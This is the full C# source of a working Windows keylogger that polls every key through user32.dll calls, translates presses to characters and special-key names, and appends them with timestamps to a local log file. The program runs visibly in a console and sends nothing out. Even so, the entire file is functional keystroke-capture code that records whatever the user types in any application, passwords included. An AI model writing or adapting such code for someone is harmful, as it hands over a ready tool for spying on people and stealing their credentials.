using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Threading;

class Keylogger
{
    // Windows API imports
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern int GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    private static extern int ToUnicode(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags);

    private static string logFile;
    private static bool[] keyPressed = new bool[256];

    static void Main(string[] args)
    {
        // Setup log file
        string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
        string exePath = AppDomain.CurrentDomain.BaseDirectory;
        logFile = Path.Combine(exePath, "keylog_" + timestamp + ".txt");

        Console.WriteLine("[*] Keylogger started");
        Console.WriteLine("[*] Logging to: " + logFile);
        Console.WriteLine("[*] Press Ctrl+C to stop\n");

        // Setup Ctrl+C handler
        Console.CancelKeyPress += new ConsoleCancelEventHandler(OnExit);

        // Start capture loop
        CaptureKeys();
    }

    static void CaptureKeys()
    {
        try
        {
            while (true)
            {
                Thread.Sleep(10); // 10ms polling interval

                // Check all keyboard keys (0x08 to 0xFE)
                for (int vKey = 8; vKey <= 254; vKey++)
                {
                    short keyState = GetAsyncKeyState(vKey);

                    // Check if key is currently pressed (high-order bit set)
                    if ((keyState & 0x8000) != 0)
                    {
                        // Only process if this is a new key press
                        if (!keyPressed[vKey])
                        {
                            keyPressed[vKey] = true;
                            ProcessKey(vKey);
                        }
                    }
                    else
                    {
                        // Key released
                        keyPressed[vKey] = false;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("\n[!] Error: " + ex.Message);
        }
    }

    static void ProcessKey(int vKey)
    {
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

        // Get keyboard state
        byte[] keyboardState = new byte[256];
        GetKeyboardState(keyboardState);

        // Try to convert to character
        StringBuilder buffer = new StringBuilder(64);
        uint scanCode = MapVirtualKey((uint)vKey, 0);
        int result = ToUnicode((uint)vKey, scanCode, keyboardState, buffer, buffer.Capacity, 0);

        if (result > 0)
        {
            // Regular character
            string character = buffer.ToString();
            LogKey(timestamp, "Key: " + character);
            Console.Write(character);
        }
        else
        {
            // Special key
            string specialKey = GetSpecialKeyName(vKey);
            if (!string.IsNullOrEmpty(specialKey))
            {
                LogKey(timestamp, "Special: " + specialKey);

                if (specialKey == "SPACE")
                {
                    Console.Write(" ");
                }
                else if (specialKey == "ENTER")
                {
                    Console.WriteLine();
                }
                else if (specialKey == "TAB")
                {
                    Console.Write("\t");
                }
                else
                {
                    Console.Write("[" + specialKey + "]");
                }
            }
        }
    }

    static string GetSpecialKeyName(int vKey)
    {
        switch (vKey)
        {
            case 0x08: return "BACKSPACE";
            case 0x09: return "TAB";
            case 0x0D: return "ENTER";
            case 0x10: return "SHIFT";
            case 0x11: return "CTRL";
            case 0x12: return "ALT";
            case 0x1B: return "ESC";
            case 0x20: return "SPACE";
            case 0x21: return "PAGE_UP";
            case 0x22: return "PAGE_DOWN";
            case 0x23: return "END";
            case 0x24: return "HOME";
            case 0x25: return "LEFT";
            case 0x26: return "UP";
            case 0x27: return "RIGHT";
            case 0x28: return "DOWN";
            case 0x2D: return "INSERT";
            case 0x2E: return "DELETE";
            case 0x70: return "F1";
            case 0x71: return "F2";
            case 0x72: return "F3";
            case 0x73: return "F4";
            case 0x74: return "F5";
            case 0x75: return "F6";
            case 0x76: return "F7";
            case 0x77: return "F8";
            case 0x78: return "F9";
            case 0x79: return "F10";
            case 0x7A: return "F11";
            case 0x7B: return "F12";
            default: return null;
        }
    }

    static void LogKey(string timestamp, string keyInfo)
    {
        try
        {
            File.AppendAllText(logFile, timestamp + " - " + keyInfo + "\n");
        }
        catch (Exception ex)
        {
            Console.WriteLine("\n[!] Logging error: " + ex.Message);
        }
    }

    static void OnExit(object sender, ConsoleCancelEventArgs args)
    {
        Console.WriteLine("\n\n[*] Keylogger stopped");
        Console.WriteLine("[*] Log saved to: " + logFile);
        Environment.Exit(0);
    }
}
